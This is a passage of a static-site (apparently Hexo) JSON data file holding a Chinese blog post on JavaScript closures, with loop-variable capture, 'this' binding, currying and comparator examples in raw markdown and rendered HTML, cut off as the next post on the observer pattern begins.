btnList[j].onclick = function() {\n      console.log(\"第\" + j + \"个按钮被点击到了\");\n    };\n  })(i);\n}\n```\n## 对象排序\n```js\nvar arr = [{\n        id: 1,\n        name: 'Jack'\n    },\n    {\n        id: 3,\n        name: 'Tom'\n    },\n    {\n        id: 2,\n        name: 'Alax'\n    }\n];\n\nfunction createComparisonFunction(propertyName) {\n    return function(object1, object2) {\n        var value1 = object1[propertyName];\n        var value2 = object2[propertyName];\n        if (value1 < value2) {\n            return -1;\n        } else if (value1 > value2) {\n            return 1;\n        } else {\n            return 0;\n        }\n    };\n}\nconsole.log(arr.sort(createComparisonFunction('id')));\n```\n#后记","source":"_posts/2019/02/2019-02-01-闭包.md","raw":"---\ntitle: 闭包--知识总结及实践\ntags:\n  - JavaScript\ncategories:\n  - 前端\ndate: 2019-02-01 10:20:40\nupdated: 2019-02-01 10:20:40\n---\n# 概述\n\n闭包是 JS 中一个很重要的概念，也是面试中时常被考察的部分。所谓闭包，就是函数中的函数，重点要理解作用域链问题。真是“请神容易送神难”，一旦请进了闭包，那么想结束这段关系，可就不是你包含函数说了算的，那要看被包含函数（闭包）的心情（姐说不玩了才能结束）。\n\n<!-- more -->\n\n# 详述\n\n## 闭包与变量\n\n_想包养可以，条件是咱们共享 wallet_\n\n```js\nfunction createFunctions() {\n  var result = new Array();\n  for (var w = 0; w < 10; w++) {\n    result[w] = function() {\n      return w;\n    };\n  }\n  return result;\n}\nvar fns = createFunctions();\nfns[2](); //10\n```\n\n_你们还是太年轻啊，叔我的策略是：定值 money_\n\n```js\nfunction createFunctions() {\n  var result = new Array();\n  for (var i = 0; i < 10; i++) {\n    result[i] = (function(num) {\n      return function() {\n        return num;\n      };\n    })(i);\n  }\n  return result;\n}\nvar fns = createFunctions();\nfns[2](); //2\n```\n\n## 关于 this 对象\n\n_我曾天真的以为，被包养就是拿别人的钱享受自己的人生_\n\n```js\nvar name = \"The Window\";\nvar object = {\n  name: \"My Object\",\n  getNameFunc: function() {\n    return function() {\n      return this.name;\n    };\n  }\n};\nalert(object.getNameFunc()()); //\"The Window\"（在非严格模式下）\n```\n\n_人老珠黄时才忽然明白，只有放到自己名下的才是自己的_\n\n```js\nvar name = \"The Window\";\nvar object = {\n  name: \"My Object\",\n  getNameFunc: function() {\n    var that = this;\n    return function() {\n      return that.name;\n    };\n  }\n};\nalert(object.getNameFunc()()); //\"My Object\"\n```\n\n## 实现`add(2)(3)`\n\n```js\nfunction add(a) {\n  return function(b) {\n    return a + b;\n  };\n}\nadd(2)(3);\n```\n## 循环中创建闭包问题\n```js\nvar btnList = document.getElementsByClassName(\"btn\");\nfor (var i = 0; i < btnList.length; i++) {\n  btnList[i].onclick = function() {\n    console.log(\"第\" + i + \"个按钮被点击到了\");\n  };\n}\n\n// 解决方法\nfor (var i = 0; i < btnList.length; i++) {\n  (function(j) {\n    btnList[j].onclick = function() {\n      console.log(\"第\" + j + \"个按钮被点击到了\");\n    };\n  })(i);\n}\n```\n## 对象排序\n```js\nvar arr = [{\n        id: 1,\n        name: 'Jack'\n    },\n    {\n        id: 3,\n        name: 'Tom'\n    },\n    {\n        id: 2,\n        name: 'Alax'\n    }\n];\n\nfunction createComparisonFunction(propertyName) {\n    return function(object1, object2) {\n        var value1 = object1[propertyName];\n        var value2 = object2[propertyName];\n        if (value1 < value2) {\n            return -1;\n        } else if (value1 > value2) {\n            return 1;\n        } else {\n            return 0;\n        }\n    };\n}\nconsole.log(arr.sort(createComparisonFunction('id')));\n```\n#后记","slug":"2019-02-01-闭包","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8x90059wovv3usvv2ha","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>闭包是 JS 中一个很重要的概念，也是面试中时常被考察的部分。所谓闭包，就是函数中的函数，重点要理解作用域链问题。真是“请神容易送神难”，一旦请进了闭包，那么想结束这段关系，可就不是你包含函数说了算的，那要看被包含函数（闭包）的心情（姐说不玩了才能结束）。</p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"闭包与变量\"><a href=\"#闭包与变量\" class=\"headerlink\" title=\"闭包与变量\"></a>闭包与变量</h2><p><em>想包养可以，条件是咱们共享 wallet</em></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createFunctions</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> result = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> w = <span class=\"number\">0</span>; w &lt; <span class=\"number\">10</span>; w++) &#123;</span><br><span class=\"line\">    result[w] = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> w;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> fns = createFunctions();</span><br><span class=\"line\">fns[<span class=\"number\">2</span>](); <span class=\"comment\">//10</span></span><br></pre></td></tr></table></figure>\n<p><em>你们还是太年轻啊，叔我的策略是：定值 money</em></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createFunctions</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> result = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">    result[i] = (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">num</span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> num;</span><br><span class=\"line\">      &#125;;</span><br><span class=\"line\">    &#125;)(i);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> fns = createFunctions();</span><br><span class=\"line\">fns[<span class=\"number\">2</span>](); <span class=\"comment\">//2</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"关于-this-对象\"><a href=\"#关于-this-对象\" class=\"headerlink\" title=\"关于 this 对象\"></a>关于 this 对象</h2><p><em>我曾天真的以为，被包养就是拿别人的钱享受自己的人生</em></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> name = <span class=\"string\">\"The Window\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> object = &#123;</span><br><span class=\"line\">  name: <span class=\"string\">\"My Object\"</span>,</span><br><span class=\"line\">  getNameFunc: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.name;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">alert(object.getNameFunc()()); <span class=\"comment\">//\"The Window\"（在非严格模式下）</span></span><br></pre></td></tr></table></figure>\n<p><em>人老珠黄时才忽然明白，只有放到自己名下的才是自己的</em></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> name = <span class=\"string\">\"The Window\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> object = &#123;</span><br><span class=\"line\">  name: <span class=\"string\">\"My Object\"</span>,</span><br><span class=\"line\">  getNameFunc: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> that = <span class=\"keyword\">this</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> that.name;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">alert(object.getNameFunc()()); <span class=\"comment\">//\"My Object\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"实现add-2-3\"><a href=\"#实现add-2-3\" class=\"headerlink\" title=\"实现add(2)(3)\"></a>实现<code>add(2)(3)</code></h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">b</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a + b;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">add(<span class=\"number\">2</span>)(<span class=\"number\">3</span>);</span><br></pre></td></tr></table></figure>\n<h2 id=\"循环中创建闭包问题\"><a href=\"#循环中创建闭包问题\" class=\"headerlink\" title=\"循环中创建闭包问题\"></a>循环中创建闭包问题</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> btnList = <span class=\"built_in\">document</span>.getElementsByClassName(<span class=\"string\">\"btn\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; btnList.length; i++) &#123;</span><br><span class=\"line\">  btnList[i].onclick = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"第\"</span> + i + <span class=\"string\">\"个按钮被点击到了\"</span>);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 解决方法</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; btnList.length; i++) &#123;</span><br><span class=\"line\">  (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">j</span>) </span>&#123;</span><br><span class=\"line\">    btnList[j].onclick = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(<span class=\"string\">\"第\"</span> + j + <span class=\"string\">\"个按钮被点击到了\"</span>);</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;)(i);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"对象排序\"><a href=\"#对象排序\" class=\"headerlink\" title=\"对象排序\"></a>对象排序</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [&#123;</span><br><span class=\"line\">        id: <span class=\"number\">1</span>,</span><br><span class=\"line\">        name: <span class=\"string\">'Jack'</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        id: <span class=\"number\">3</span>,</span><br><span class=\"line\">        name: <span class=\"string\">'Tom'</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        id: <span class=\"number\">2</span>,</span><br><span class=\"line\">        name: <span class=\"string\">'Alax'</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createComparisonFunction</span>(<span class=\"params\">propertyName</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">object1, object2</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> value1 = object1[propertyName];</span><br><span class=\"line\">        <span class=\"keyword\">var</span> value2 = object2[propertyName];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (value1 &lt; value2) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (value1 &gt; value2) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(arr.sort(createComparisonFunction(<span class=\"string\">'id'</span>)));</span><br></pre></td></tr></table></figure>\n<p>#后记</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>闭包是 JS 中一个很重要的概念，也是面试中时常被考察的部分。所谓闭包，就是函数中的函数，重点要理解作用域链问题。真是“请神容易送神难”，一旦请进了闭包，那么想结束这段关系，可就不是你包含函数说了算的，那要看被包含函数（闭包）的心情（姐说不玩了才能结束）。</p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"闭包与变量\"><a href=\"#闭包与变量\" class=\"headerlink\" title=\"闭包与变量\"></a>闭包与变量</h2><p><em>想包养可以，条件是咱们共享 wallet</em></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createFunctions</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> result = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> w = <span class=\"number\">0</span>; w &lt; <span class=\"number\">10</span>; w++) &#123;</span><br><span class=\"line\">    result[w] = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> w;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> fns = createFunctions();</span><br><span class=\"line\">fns[<span class=\"number\">2</span>](); <span class=\"comment\">//10</span></span><br></pre></td></tr></table></figure>\n<p><em>你们还是太年轻啊，叔我的策略是：定值 money</em></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createFunctions</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> result = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">    result[i] = (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">num</span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> num;</span><br><span class=\"line\">      &#125;;</span><br><span class=\"line\">    &#125;)(i);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> fns = createFunctions();</span><br><span class=\"line\">fns[<span class=\"number\">2</span>](); <span class=\"comment\">//2</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"关于-this-对象\"><a href=\"#关于-this-对象\" class=\"headerlink\" title=\"关于 this 对象\"></a>关于 this 对象</h2><p><em>我曾天真的以为，被包养就是拿别人的钱享受自己的人生</em></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> name = <span class=\"string\">\"The Window\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> object = &#123;</span><br><span class=\"line\">  name: <span class=\"string\">\"My Object\"</span>,</span><br><span class=\"line\">  getNameFunc: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.name;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">alert(object.getNameFunc()()); <span class=\"comment\">//\"The Window\"（在非严格模式下）</span></span><br></pre></td></tr></table></figure>\n<p><em>人老珠黄时才忽然明白，只有放到自己名下的才是自己的</em></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> name = <span class=\"string\">\"The Window\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> object = &#123;</span><br><span class=\"line\">  name: <span class=\"string\">\"My Object\"</span>,</span><br><span class=\"line\">  getNameFunc: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> that = <span class=\"keyword\">this</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> that.name;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">alert(object.getNameFunc()()); <span class=\"comment\">//\"My Object\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"实现add-2-3\"><a href=\"#实现add-2-3\" class=\"headerlink\" title=\"实现add(2)(3)\"></a>实现<code>add(2)(3)</code></h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">b</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a + b;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">add(<span class=\"number\">2</span>)(<span class=\"number\">3</span>);</span><br></pre></td></tr></table></figure>\n<h2 id=\"循环中创建闭包问题\"><a href=\"#循环中创建闭包问题\" class=\"headerlink\" title=\"循环中创建闭包问题\"></a>循环中创建闭包问题</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> btnList = <span class=\"built_in\">document</span>.getElementsByClassName(<span class=\"string\">\"btn\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; btnList.length; i++) &#123;</span><br><span class=\"line\">  btnList[i].onclick = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"第\"</span> + i + <span class=\"string\">\"个按钮被点击到了\"</span>);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 解决方法</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; btnList.length; i++) &#123;</span><br><span class=\"line\">  (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">j</span>) </span>&#123;</span><br><span class=\"line\">    btnList[j].onclick = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(<span class=\"string\">\"第\"</span> + j + <span class=\"string\">\"个按钮被点击到了\"</span>);</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;)(i);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"对象排序\"><a href=\"#对象排序\" class=\"headerlink\" title=\"对象排序\"></a>对象排序</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [&#123;</span><br><span class=\"line\">        id: <span class=\"number\">1</span>,</span><br><span class=\"line\">        name: <span class=\"string\">'Jack'</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        id: <span class=\"number\">3</span>,</span><br><span class=\"line\">        name: <span class=\"string\">'Tom'</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        id: <span class=\"number\">2</span>,</span><br><span class=\"line\">        name: <span class=\"string\">'Alax'</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createComparisonFunction</span>(<span class=\"params\">propertyName</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">object1, object2</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> value1 = object1[propertyName];</span><br><span class=\"line\">        <span class=\"keyword\">var</span> value2 = object2[propertyName];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (value1 &lt; value2) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (value1 &gt; value2) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(arr.sort(createComparisonFunction(<span class=\"string\">'id'</span>)));</span><br></pre></td></tr></table></figure>\n<p>#后记</p>"},{"title":"观察者模式--从事件绑定到Vue数据双向绑定","date":"2019-02-01T02:21:06.000Z","updated":"2019-02-01T02:21:06.000Z","_content":"# 概述\n\n观察者(observer) 模式，也叫自定义事件(custom events)，也叫订阅/发布(subscriber/publisher)模式。其实日常很多地方都在用，只是没有意识到或者没有提炼出’观察者模式‘这个概念。例如，下面实践回顾中说的场景，jQuery中的自定义事件，Vue中的双向绑定，nodejs中的eventEmitter等。\n\n<!-- more -->\n\n# 详述\n\n## 实践回顾\n\n总结这个的起因是，最初在做一个图片编辑的 UI 组件（pipeImg），一个使用场景是：`new 